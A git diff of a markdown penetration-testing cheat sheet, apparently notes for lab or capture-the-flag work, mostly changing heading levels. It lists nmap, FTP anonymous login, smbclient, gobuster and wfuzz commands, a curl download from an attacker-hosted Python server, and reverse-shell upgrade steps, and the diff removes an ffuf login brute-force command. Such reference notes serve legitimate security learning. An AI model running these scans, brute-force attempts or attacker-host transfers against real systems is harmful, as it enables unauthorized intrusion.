@@ -8,9 +8,9 @@
 - [File searching](#fts)
 
 
-## Port Scanning <a name='psc'></a>
+# Port Scanning <a name='psc'></a>
 
-### nmap
+## nmap
 - `-sV` shows the version of the service running on each port.
 - `-sC` uses additional scripts to gather more information.
 - `-sS` stealth scan.
@@ -29,9 +29,7 @@ nmap -p<port> --script vuln <target_ip>
 ```
 
 
-## FTP Port <a name='ftp'></a>
-
-### FTP
+# FTP Port <a name='ftp'></a>
 
 ```bash
 # anonymous login
@@ -40,9 +38,9 @@ ftp <machine-ip>
 # password anonymous
 ```
 
-## Samba/SMB Port <a name='smb'></a>
+# Samba/SMB Port <a name='smb'></a>
 
-### SmbClient 
+## SmbClient 
 It is a network protocol that allows users to communicate with remote computers and servers to use their resources or share, open, and edit files.
 
 - `-U` access as user.
@@ -54,9 +52,9 @@ smbclient -U bob \\\\10.129.42.253\\users
 smbclient -N -L \\\\10.129.117.14\\
 ```
 
-## Directory Enumeration <a name='dir'></a>
+# Directory Enumeration <a name='dir'></a>
 
-### Gobuster
+## Gobuster
 It is a command-line tool used for performing brute-force scans or directory and subdomain enumeration on a website.
 - To find subdirectories:
 ````bash
@@ -74,7 +72,7 @@ gobuster dir -u <machine-ip> -w <wordlist> -o gobuster.out -t 200
 gobuster vhost -w <wordlist> -u <machine-ip> -o gobuster.out
 ````
 
-### wfuzz
+## wfuzz
 It is a command-line tool used for performing brute-force scans or directory and subdomain enumeration on a website. Also, it can be useful for enumerate files with an specific extension.
 - To find subdirectories:
 ```bash
@@ -93,17 +91,9 @@ wfuzz -c --hc 404 -w <wordlist> http://<machine-ip>/FUZZ
 #--hc 404 don't print errors
 wfuzz -c --hc 404 -w <wordlist> http://<machine-ip>/FUZZ.php
 ```
-## Login Bruteforce <a name="log"></a>
-
-##### ffuf
-
-```bash
-# wordlist = rockyou.txt
-ffuf -u http://<machine-ip>/login-page.php -X POST -d '{"user":"FUZZ", "pass":"FUZZ"}' -w wordlist
-```
 
 
-## Python server for file transmision<a name="ft"></a>
+# Python server for file transmision<a name="ft"></a>
 
 ```bash 
 # on the attacker machine
@@ -115,7 +105,7 @@ curl http://<attacker-ip>:<port>/<file> -o <output-file>
 ```
 
 
-## Upgrade Shell <a name='us'></a>
+# Upgrade Shell <a name='us'></a>
 
 When we do a reverse shell, sometimes, we will need to upgrade our shell.
 
@@ -130,9 +120,9 @@ reset xterm
 export TERM=xterm
 ```
 
-## File searching <a name='fs'></a>
+# File searching <a name='fs'></a>
 
-### find
+## find
 
 Parameters:
 - `-name <pattern>`: Matches files or directories with a specific name pattern.
